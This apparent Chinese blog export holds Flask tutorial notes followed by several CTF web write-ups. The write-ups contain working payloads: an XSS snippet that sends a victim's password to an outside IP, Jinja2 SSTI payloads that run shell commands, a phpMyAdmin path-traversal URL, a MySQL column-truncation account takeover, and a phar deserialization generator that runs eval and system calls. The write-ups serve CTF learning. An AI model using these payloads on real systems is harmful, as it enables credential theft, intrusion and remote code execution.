Response(&#x27;Custom response with headers&#x27;, status=200)    response.headers[&#x27;X-Custom-Header&#x27;] = &#x27;Value&#x27;    return response\n\n\njsonify(data)：将字典转换为 JSON 响应。\nResponse(&#39;Custom response with headers&#39;, status=200)：创建自定义响应对象。\n\n静态文件和模板\n我们之前有这么一串代码\napp = Flask(__name__)\n\n这是将此文件作为Flask的模板，我们也可以引入其他文件作为模板\n静态文件（如 CSS、JavaScript、图片）可以通过 static 路由访问。模板文件则通过 templates 文件夹组织，用于渲染 HTML 页面。\n静态文件访问:\n&lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;style.css&#x27;) &#125;&#125;&quot;&gt;\n\n这和文件包含类似，相当于包含了style.css文件\n实例:\nfrom flask import render_template@app.route(&#x27;/hello/&lt;name&gt;&#x27;)def hello(name):    return render_template(&#x27;hello.html&#x27;, name=name)\n\n渲染html页面\n8.路由优先级\nFlask 按照定义的顺序匹配路由，第一个匹配成功的路由将被处理。确保更具体的路由放在更一般的路由之前。\n@app.route(&#x27;/user/&lt;int:user_id&gt;&#x27;)def user_profile(user_id):    return f&#x27;User ID: &#123;user_id&#125;&#x27;@app.route(&#x27;/user&#x27;)def user_list():    return &#x27;User List&#x27;\n\n如果带参数则匹配第一个路由，不带参数则匹配第二个路由\n5.Flask 视图函数不知道为什么这个要叫视图函数，我认为和普通的python函数差不多，以前也了解了一些基础知识，所以只学其他的\n视图函数是 Flask 应用中的核心部分，它负责处理请求并生成响应。\n视图函数与路由紧密结合，通过路由将 URL 映射到具体的视图函数。\n以下是对 Flask 视图函数的详细说明，包括如何定义、使用请求数据、返回响应、以及如何处理错误等。\n\n定义视图函数：视图函数是处理请求并返回响应的核心功能。\n接收请求数据：使用 request 对象获取 URL 参数、表单数据、查询参数等。\n返回响应：可以返回字符串、HTML、JSON 或自定义响应对象。\n处理请求和响应：使用 request 对象和 make_response 来处理请求和生成自定义响应。\n处理错误：视图函数内处理异常或使用 Flask 的错误处理机制。\n视图函数的装饰器：使用 @app.before_request、@app.after_request 等装饰器处理请求前后逻辑。\n视图函数返回的状态码：可以指定 HTTP 状态码来表示请求的处理结果。\n\n1.接收请求数据\n视图函数可以接收不同类型的请求数据，包括 URL 参数、表单数据、查询参数等。\n获取 URL 参数：\n@app.route(&#x27;/greet/&lt;name&gt;&#x27;)def greet(name):    return f&#x27;Hello, &#123;name&#125;!&#x27;\n\n\n&lt;name&gt; 是一个 URL 参数，传递到视图函数 greet。\n\n获取表单数据:\nfrom flask import request@app.route(&#x27;/submit&#x27;, methods=[&#x27;POST&#x27;])def submit():    username = request.form.get(&#x27;username&#x27;)    return f&#x27;Form submitted by &#123;username&#125;!&#x27;\n\n**request.form.get(‘username’)**：获取 POST 请求中表单数据的 username 字段。和form表单差不多，使用POST请求也可以\n获取查询数据：\n@app.route(&#x27;/search&#x27;)def search():    query = request.args.get(&#x27;query&#x27;)    return f&#x27;Search results for: &#123;query&#125;&#x27;\n\n**request.args.get(‘query’)**：获取 GET 请求中的查询参数 query。这个就是url的GET传参\n2.返回响应\n视图函数可以返回多种类型的响应，包括字符串、HTML、JSON、或自定义响应对象。\n返回字符串：\n@app.route(&#x27;/message&#x27;)def message():    return &#x27;This is a simple message.&#x27;\n\n返回 HTML 模板：\nfrom flask import render_template@app.route(&#x27;/hello/&lt;name&gt;&#x27;)render_template(&#x27;hello.html&#x27;, name=name)#name=name用于传递参数\n\n**render_template(‘hello.html’, name&#x3D;name)**：渲染 HTML 模板 hello.html，并将 name 变量传递给模板。\n返回 JSON 数据：\nfrom flask import jsonify@app.route(&#x27;/api/data&#x27;)def api_data():    data = &#123;&#x27;key&#x27;: &#x27;value&#x27;&#125;    return jsonify(data)\n\n**jsonify(data)**：将 Python 字典转换为 JSON 响应\n返回自定义响应对象\nfrom flask import Response@app.route(&#x27;/custom&#x27;)def custom_response():    response = Response(&#x27;Custom response with headers&#x27;, status=200)    response.headers[&#x27;X-Custom-Header&#x27;] = &#x27;Value&#x27;    return response\n\n**Response(‘Custom response with headers’, status&#x3D;200)**：创建自定义响应对象，并设置响应头。\n3.处理请求和响应\n视图函数可以访问请求对象，并根据请求数据生成响应。可以使用 request 对象来获取请求的信息，使用 make_response 来创建自定义响应。\n使用 request 对象：\nfrom flask import request@app.route(&#x27;/info&#x27;)def info():    user_agent = request.headers.get(&#x27;User-Agent&#x27;)    return f&#x27;Your user agent is &#123;user_agent&#125;&#x27;#获取请求头的各种信息from flask import make_response@app.route(&#x27;/header&#x27;)def custom_header():    response = make_response(&#x27;Response with custom header&#x27;)    response.headers[&#x27;X-Custom-Header&#x27;] = &#x27;Value&#x27;    return response#我们通过make_response创建自定义响应\n\n4.处理错误\n可以在视图函数中处理异常或错误，或者通过 Flask 提供的错误处理机制来处理应用中的错误。\n在视图函数中处理错误:\n实例:\n@app.route(&#x27;/divide/&lt;int:x&gt;/&lt;int:y&gt;&#x27;)def divide(x, y):    try:        result = x / y        return f&#x27;Result: &#123;result&#125;&#x27;    except ZeroDivisionError:        return &#x27;Error: Division by zero&#x27;, 400#使用 try-except 语句处理除零错误，并返回自定义错误消息和状态码。#全局错误处理:@app.errorhandler(404)def not_found(error):    return &#x27;Page not found&#x27;, 404#@app.errorhandler(404)：定义处理 404 错误的函数。\n\n5.视图函数的装饰器\n除了 @app.route，Flask 还支持其他装饰器，用于实现更复杂的功能。\n示例：\n\n**@app.before_request**：在每个请求处理之前运行的函数。\n**@app.after_request**：在每个请求处理之后运行的函数。\n**@app.teardown_request**：在请求结束后运行的函数，用于清理工作。\n\n示例装饰器使用：\n@app.before_requestdef before_request():    print(&#x27;Before request&#x27;)@app.after_requestdef after_request(response):    print(&#x27;After request&#x27;)    return response@app.teardown_requestdef teardown_request(exception):    print(&#x27;Teardown request&#x27;)\n\n6.视图函数返回的状态码\n视图函数不仅可以返回内容，还可以指定 HTTP 状态码。\n实例：\n@app.route(&#x27;/status&#x27;)def status():    return &#x27;Everything is OK&#x27;, 200#返回状态码 200 表示请求成功。#返回带有状态码的响应对象：from flask import Response@app.route(&#x27;/error&#x27;)def error():    return Response(&#x27;An error occurred&#x27;, status=500)\n\n\n\n6.模板渲染模板是包含占位符的 HTML 文件。\nFlask 使用 Jinja2 模板引擎来处理模板渲染。模板渲染允许你将动态内容插入到 HTML 页面中，使得应用能够生成动态的网页内容。\n以下是关于 Flask 模板渲染的详细说明，包括如何创建和使用模板、模板继承、控制结构等。\n\n创建模板：将 HTML 文件放在 templates 文件夹中，使用 Jinja2 占位符。\n渲染模板：使用 render_template 函数在视图函数中渲染模板。\n模板继承：创建基础模板，允许其他模板继承和扩展。\n控制结构：使用条件语句和循环在模板中控制逻辑。\n过滤器：使用过滤器格式化变量数据。\n宏和模板包含：创建和使用宏以及模板包含，提高模板的复用性。\n安全性：Jinja2 默认对模板变量进行自动转义以防止 XSS 攻击。\n模板上下文：将数据传递给模板，并在模板中使用这些数据。\n\n基本概念\n模板是包含占位符的 HTML 文件。\nFlask 使用 Jinja2 模板引擎来渲染这些模板，将 Python 数据插入到 HTML 中，从而生成最终的网页。\n1.创建模板模板文件通常放在项目的 templates 文件夹中。\nFlask 会自动从这个文件夹中查找模板文件。\n创建模板文件：在项目目录下创建 templates 文件夹，并在其中创建一个 HTML 文件，如 index.html。\ntemplates&#x2F;index.html 文件代码：\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Welcome&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt;    &lt;p&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n&#123;&#123; title &#125;&#125; 和 &#123;&#123; name &#125;&#125; 是模板占位符，将在渲染时被替换成实际的值。\n在视图函数中渲染模板：\nfrom flask import Flask, render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home():    return render_template(&#x27;index.html&#x27;, title=&#x27;Welcome Page&#x27;, name=&#x27;John Doe&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n\nr**ender_template(‘index.html’, title&#x3D;’Welcome Page’, name&#x3D;’John Doe’)**：渲染 index.html 模板，并将 title 和 name 变量传递给模板。\n2.模板继承模板继承允许你创建一个基础模板，然后在其他模板中继承和扩展这个基础模板，避免重复的 HTML 代码。\n创建基础模板：在 templates 文件夹中创建一个基础模板 base.html。\ntemplates&#x2F;base.html 示例：\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&#123;% block title %&#125;My Website&#123;% endblock %&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;header&gt;        &lt;h1&gt;My Website&lt;/h1&gt;    &lt;/header&gt;    &lt;main&gt;        &#123;% block content %&#125;&#123;% endblock %&#125;    &lt;/main&gt;    &lt;footer&gt;        &lt;p&gt;Footer content&lt;/p&gt;    &lt;/footer&gt;&lt;/body&gt;&lt;/html&gt;\n\n&#123;% block title %&#125;&#123;% endblock %&#125; 和 &#123;% block content %&#125;&#123;% endblock %&#125; 是定义的可替换区域。\n创建子模板：在 templates 文件夹中创建一个子模板 index.html，继承 base.html。\ntemplates&#x2F;index.html 文件代码：\n&#123;% block title %&#125;Home Page&#123;% endblock %&#125;&#123;% block content %&#125;&lt;h2&gt;Welcome to the Home Page!&lt;/h2&gt;&lt;p&gt;Content goes here.&lt;/p&gt;&#123;% endblock %&#125;\n\n&#123;% extends \"base.html\" %&#125;：继承基础模板。\n&#96;\n"},{"title":"[FBCTF2019]Products_Manager","url":"/2025/06/11/FBCTF2019-Products-Manager/","content":"[FBCTF2019]Products Manager终于看见一个题解不长的题目了，我们进入靶场发现是有三个选项\n\n\n分别是查看前五的产品，添加产品，查询产品。题目给了源码，我们直接来看源码。\n根目录下这几个php文件都没什么用，主要是进行sql操作的db.php\n&lt;?php/*CREATE TABLE products (  name char(64),  secret char(64),  description varchar(250));INSERT INTO products VALUES(&#x27;facebook&#x27;, sha256(....), &#x27;FLAG_HERE&#x27;);INSERT INTO products VALUES(&#x27;messenger&#x27;, sha256(....), ....);INSERT INTO products VALUES(&#x27;instagram&#x27;, sha256(....), ....);INSERT INTO products VALUES(&#x27;whatsapp&#x27;, sha256(....), ....);INSERT INTO products VALUES(&#x27;oculus-rift&#x27;, sha256(....), ....);*/error_reporting(0);require_once(&quot;config.php&quot;); // DB config$db = new mysqli($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DBNAME);if ($db-&gt;connect_error) &#123;  die(&quot;Connection failed: &quot; . $db-&gt;connect_error);&#125;function check_errors($var) &#123;  if ($var === false) &#123;    die(&quot;Error. Please contact administrator.&quot;);  &#125;&#125;function get_top_products() &#123;  global $db;  $statement = $db-&gt;prepare(    &quot;SELECT name FROM products LIMIT 5&quot;  );  check_errors($statement);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $products = [];  while ( ($product = $res-&gt;fetch_assoc()) !== null) &#123;    array_push($products, $product);  &#125;  $statement-&gt;close();  return $products;&#125;function get_product($name) &#123;  global $db;  $statement = $db-&gt;prepare(    &quot;SELECT name, description FROM products WHERE name = ?&quot;  );  check_errors($statement);  $statement-&gt;bind_param(&quot;s&quot;, $name);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  $product = $res-&gt;fetch_assoc();  $statement-&gt;close();  return $product;&#125;function insert_product($name, $secret, $description) &#123;  global $db;  $statement = $db-&gt;prepare(    &quot;INSERT INTO products (name, secret, description) VALUES      (?, ?, ?)&quot;  );  check_errors($statement);  $statement-&gt;bind_param(&quot;sss&quot;, $name, $secret, $description);  check_errors($statement-&gt;execute());  $statement-&gt;close();&#125;function check_name_secret($name, $secret) &#123;  global $db;  $valid = false;  $statement = $db-&gt;prepare(    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;  );  check_errors($statement);  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);  check_errors($statement-&gt;execute());  $res = $statement-&gt;get_result();  check_errors($res);  if ($res-&gt;fetch_assoc() !== null) &#123;    $valid = true;  &#125;  $statement-&gt;close();  return $valid;&#125;\n\n这个文件通过sql语句实现了界面上的这三个功能，添加产品进行了预处理，而且查询产品信息也进行了预处理，所以二次注入行不通。\n看了题解后发现，这个题目的代码不是突破口，而是sql的一个机制。\n我们回忆起来，当我们设置sql中的columns时会发现我们需要设定一个字符数目，这是数据库的另一个特性，当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。\n然后我们再来看一下数据库中字符串的查询比较\n在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，由于String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。\n如下两条查询语句：\nselect * from users where username&#x3D;’Dumb’\nselect * from users where username&#x3D;’Dumb ‘\n它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的username和数据库里的username值进行比较时，它们就是一个字符串的比较操作，符合上述特征。\n\n\n我们可以看出即使我们在查询时添加了很多的空格，但是在字符串进行比较的时候，sql会填充空格进行比较从而查询出来\n\n\n这个操作也显示了我们可以通过这种添加空格的方式去查到其他东西\n于是我们只需要通过这个方法往Mysql中写入我们一个其他账户，然后用我们的密码去实现一些操作\n//这是add.php的添加数据部分function handle_post() &#123;  global $_POST;  $name = $_POST[&quot;name&quot;];  $secret = $_POST[&quot;secret&quot;];  $description = $_POST[&quot;description&quot;];  if (isset($name) &amp;&amp; $name !== &quot;&quot;        &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;        &amp;&amp; isset($description) &amp;&amp; $description !== &quot;&quot;) &#123;    if (validate_secret($secret) === false) &#123;      return &quot;Invalid secret, please check requirements&quot;;    &#125;    $product = get_product($name);    if ($product !== null) &#123;      return &quot;Product name already exists, please enter again&quot;;    &#125;    insert_product($name, hash(&#x27;sha256&#x27;, $secret), $description);    echo &quot;&lt;p&gt;Product has been added&lt;/p&gt;&quot;;  &#125;  return null;&#125;\n\n这里的防止重名的方法是，将我们的输入名字拿去select查询，如果查到了就终止，反之则添加数据。我们利用的就是insert会根据字段长度而进行截断，但select查询不会进行截断这个特点进行添加信息\n我们要做的就是通过添加空格超出字符限制然后再后面随便加一个字符绕过select查询\n那在成功写入以后我们如何进行越权呢\n//我们来看进行查询的view.phpfunction handle_post() &#123;  global $_POST;  $name = $_POST[&quot;name&quot;];  $secret = $_POST[&quot;secret&quot;];  if (isset($name) &amp;&amp; $name !== &quot;&quot;        &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123;    if (check_name_secret($name, hash(&#x27;sha256&#x27;, $secret)) === false) &#123;      return &quot;Incorrect name or secret, please try again&quot;;    &#125;    $product = get_product($name);    echo &quot;&lt;p&gt;Product details:&quot;;    echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&#x27;name&#x27;]) . &quot;&lt;/li&gt;&quot;;    echo &quot;&lt;li&gt;&quot; . htmlentities($product[&#x27;description&#x27;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;  &#125;  return null;&#125;\n\n这里我们可以看到在进行insert和select查询语句的时候都使用到了hash进行哈希加密，应该是为了防止拿到加密值后反推出密码吧，但是难道不怕哈希碰撞吗。\n重点在于在验证name和secret存在后就直接使用get_product拿着name去查询，然后返回查询结果。\n于是我们可以实现越权\nname:facebook                                                                       1secret:Fuckyourmom1//拿这个添加产品\n\n\n\n添加完后我们再使用这个账号进行查询\nname:facebooksecret:Fuckyourmom1//由于我们添加数据的时候被截断了，所以我们直接用facebook即可\n\n\n"},{"title":"[GWCTF_2019]mypassword","url":"/2025/10/15/GWCTF-2019-mypassword/","content":"[GWCTF_2019]mypassword题目进入是一个登录框，这个题目我看了一下和比赛的前端界面是不一样的，也就是我们需要自己去找php文件来访问界面，在前端是看不到的\n\n\n我们在源代码中看见了register.php，访问发现可以注册，尝试注册admin提示用户已存在，也就是这个题目会和admin账号有关\n注册，登录进去发现，在源码中有feedback.php\n\n\n访问发现是一个输入框，其中输入的内容会回显到list.php\n然后我们在feedback.php的页面源代码中看到了被注释的源码\nif(is_array($feedback))&#123;\techo &quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;;\treturn false;&#125;$blacklist = [&#x27;_&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&amp;&#x27;,&#x27;\\\\&#x27;,&#x27;#&#x27;,&#x27;%&#x27;,&#x27;input&#x27;,&#x27;script&#x27;,&#x27;iframe&#x27;,&#x27;host&#x27;,&#x27;onload&#x27;,&#x27;onerror&#x27;,&#x27;srcdoc&#x27;,&#x27;location&#x27;,&#x27;svg&#x27;,&#x27;form&#x27;,&#x27;img&#x27;,&#x27;src&#x27;,&#x27;getElement&#x27;,&#x27;document&#x27;,&#x27;cookie&#x27;];foreach ($blacklist as $val) &#123;       while(true)&#123;           if(stripos($feedback,$val) !== false)&#123;               $feedback = str_ireplace($val,&quot;&quot;,$feedback);           &#125;else&#123;               break;           &#125;       &#125;   &#125;\n\n这个过滤关键字虽然使用的是替换，但是由于其加了一个循环导致双写绕过不了，但是由于一次循环过滤的是一个关键字，我们可以利用scrcookieipt这样的方式进行绕过\n然后这个是大佬的poc，\n&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt;    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;    docucookiement.locacookietion=&quot;http://10.88.15.81:7777?a=&quot;+psw;&lt;/scrcookieipt&gt;\n\n然后这个题目就是通过docucookiement.getcookieElementsByName获取到前端中储存的密码然后发送到目标URL，即为flag\n\n"},{"title":"[GWCTF_2019]你的名字","url":"/2025/05/19/GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/","content":"[GWCTF_2019]你的名字这个题目就是一个简单的SSTI注入，只是过滤掉了一些关键字。本来应该没什么含金量的，但是，我感觉需要改变一下做题思路了\n这个题目主要是过滤掉了&#123;&#123;和下划线和关键词，可以正常绕过，但是焚靖梭哈更有性价比，虽然这题不能用就是了。但是编码绕过还是比正常绕过好用\n这题我本来是想用以前固定的lipsum直接使用os模块进行命令执行，但是报错了，后来发现是根本就没有os模块，原来payload不是固定的，这也就不得不多收集一些可以直接使用的payload\n#正常绕过&#123;%print lipsum.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;__im&#x27;+&#x27;port__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;)[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()%&#125;#编码绕过&#123;%print lipsum[&#x27;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f&#x27;](&#x27;\\u006f\\u0073&#x27;)[&#x27;\\u0070\\u006f\\u0070\\u0065\\u006e&#x27;](&#x27;cat /flag_1s_Hera&#x27;).read()%&#125;\n\n"},{"title":"[GWCTF_2019]我有一个数据库","url":"/2025/07/10/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/","content":"[GWCTF_2019]我有一个数据库题目进去什么都没有，使用dirsearch扫一下发现存在phpinfo.php和&#x2F;phpmyadmin\n一个是phpinfo，另外则是phpmyadmin的数据库图形化界面。\n看了题解发现我们可以在界面中看到phpMyadmin的版本然后去CVE上查找漏洞\n\n\n我看了一下我现在使用的是phpMyadmin4.8.5版本的发现存在一个通过用户名实现sql注入攻击的漏洞，但是我估计是看不懂的\n我也看了一下4.8.1版本的漏洞，发现就是题解的这个，但是对于我这种垃圾，通过审计代码去看懂漏洞，完全不可能，能做到也就只是抄下payload而已\n这里放上大佬的复现博客\n\n\n这种题目的目的应该就是让我们自己去网上找payload，要是通过审计代码审出来了估计比赛都结束了。\npayload\n/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag\n\n"},{"title":"[GXYCTF2019]BabysqliV3.0","url":"/2025/05/06/GXYCTF2019-BabysqliV3-0/","content":"[GXYCTF2019]BabysqliV3.0题目界面是一个登录框，以为sql要来了，结果tmd，这个题目和sql没半毛钱关系，什么时候题目都可以骗人了，搞得我想要报警\n登录框实际上是一个弱口令登录，密码甚至都给我们放在框里面了\nadminpassword//直接登录成功\n\n登录成功后就跳转到一个文件上传的界面\n\n\n我们注意这两个地方，通过参数实现了包含upload.php，会在后面自动加上php，我们可以尝试使用这个参数去访问其他php文件\n后面发现了，我们只有在file参数中存在hom或者upload的情况下才能添加php，不然添加的都是当前引用的是 index.fxxkyou!\n于是我们可以使用php伪协议去访问home.php和upload.php\nphp://filter/convert.base64-encode/resource=home.phpphp://filter/convert.base64-encode/resource=upload.php\n\n经过解码成功拿到源码\n//home.php&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION[&#x27;user&#x27;]))&#123;    if(isset($_GET[&#x27;file&#x27;]))&#123;        if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123;            die(&quot;hacker!&quot;);        &#125;        else&#123;            if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#x27;file&#x27;]))&#123;                $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;;            &#125;            else&#123;                $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;;            &#125;            echo &quot;当前引用的是 &quot;.$file;            require $file;        &#125;    &#125;    else&#123;        die(&quot;no permission!&quot;);    &#125;&#125;?&gt;\n\n\n\n//upload.php&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    上传文件    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader&#123;    public $Filename;    public $cmd;    public $token;    function __construct()&#123;        $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;;//获取当前目录，加密得到路径        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#x27;name&#x27;]))&#123;            //过滤了各种伪协议，未被过滤则name直接赋值给Filename            $this-&gt;Filename = $_GET[&#x27;name&#x27;];        &#125;        else&#123;            $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;            //被过滤掉了则会创建一个txt文件        &#125;        $this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;;        $this-&gt;token = $_SESSION[&#x27;user&#x27;];    &#125;    function upload($file)&#123;        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;            $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;;            //Filename只能包含数字和小写字母        &#125;        else&#123;            if($file[&#x27;size&#x27;] &gt; 1024)&#123;                $this-&gt;cmd = &quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;;            &#125;            else&#123;                $this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;;                //过了过滤则执行命令创建文件            &#125;        &#125;    &#125;    function __toString()&#123;        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    &#125;    function __destruct()&#123;        if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;            $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;        &#125;        eval($this-&gt;cmd);        //最后执行命令    &#125;&#125;if(isset($_FILES[&#x27;file&#x27;])) &#123;    $uploader = new Uploader();//实例化类，触发__construct     $uploader-&gt;upload($_FILES[&quot;file&quot;]);    //调用upload函数    if(@file_get_contents($uploader))&#123;        echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);//触发__tostring    &#125;&#125;?&gt;\n\nhome.php就是实现了一个文件包含和file参数的一个过滤和拼接后缀。我们重点看upload.php\n我们看完之后发现有类却没有反序列化的地方，那估计是要用到phar文件了。但是看了wp发现方法有好多种。\n非预期解一\n触发file_get_contents的时候用到的是__tostring方法返回的值，然而我们的filename只需要我们绕过正则就能被返回\n但是我亲手去试了一下这个非预期解，发现这就是题目的一个漏洞，如果搞不好可以把flag给覆盖掉，虽然显示的读取的是flag.php，但实际上读取的是被我们上传文件覆盖了的flag.php。所以我们一旦这个方法读取flag失败了，我们这个靶场就废掉了，因为flag.php已经被覆盖了\n\n\n我们需要在第一name&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的时候配合上传文件才能保证flag.php不被我们上传的文件覆盖\n预期解二\n由于对上传文件其实没有什么过滤，我们只需要绕过一些会改变cmd的判断就行了\n$this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;//只要我们不传入name，这个生成的filename可以绕过下面的正则if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;            $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;;            //Filename只能包含数字和小写字母        &#125;//最后执行命令的时候还要校验一遍$_SESSION[&#x27;user&#x27;]，我们必须想办法获得if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123;            $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;;        &#125;        eval($this-&gt;cmd);\n\n我们只需要上传一个正常的文件且不传递name，就能够让$_SESSION[&#39;user&#39;]作为文件名，然后触发__tostring去输出filename\n\n\n我们成功拿到$_SESSION[&#39;user&#39;]，就可以过__destruct的验证，可以直接开始写phar文件了\n&lt;?phpclass Uploader&#123;    public $Filename = &#x27;aaa&#x27;;    //public $cmd =&#x27;echo phpinfo();&#x27;;//可先用此测试    public $cmd =&#x27;echo file_get_contents(&quot;/var/www/html/flag.php&quot;)&#x27;;//传递一个可控hack参数    public $token =&#x27;GXY2fb123ad4ed9758d14f09783bdb2651d&#x27;;//先上串一个合法文件得到session[&#x27;user&#x27;]    //public $cmd =&#x27;echo system($_GET[&quot;hack&quot;]);&#x27;;&#125;$a=new Uploader();@unlink(&#x27;test.phar&#x27;);$phar=new Phar(&#x27;test.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);$phar-&gt;stopBuffering();?&gt;\n\n"},{"title":"[GYCTF2020]Easyphp","url":"/2025/04/29/GYCTF2020-Easyphp/","content":"[GYCTF2020]Easyphp被这些题目搞得Easy都要从我的世界中消失了，这道题目只能说难得要死，我目前为止遇到过最难的反序列化题\n界面很简单，就一个登录框，我们尝试访问www.zip拿到源码，这才是噩梦的开始\n//index.php&lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&#x27;action&#x27;]))&#123;\trequire_once(__DIR__.&quot;/&quot;.$_GET[&#x27;action&#x27;].&quot;.php&quot;);&#125;else&#123;\tif($_SESSION[&#x27;login&#x27;]==1)&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;;\t&#125;\telse&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;;\t&#125;&#125;?&gt;//这个不重要，只是通过action去传参实现跳转\n\n//login.php&lt;?phprequire_once(&#x27;lib.php&#x27;);?&gt;&lt;?php $user=new user();if(isset($_POST[&#x27;username&#x27;]))&#123;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;\t\tdie(&quot;&lt;br&gt;Damn you, hacker!&quot;);\t&#125;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123;\t\tdie(&quot;Damn you, hacker!&quot;);\t&#125;\t$user-&gt;login();&#125;?&gt;//把没用的前端给删掉了\n\n//update.php&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta 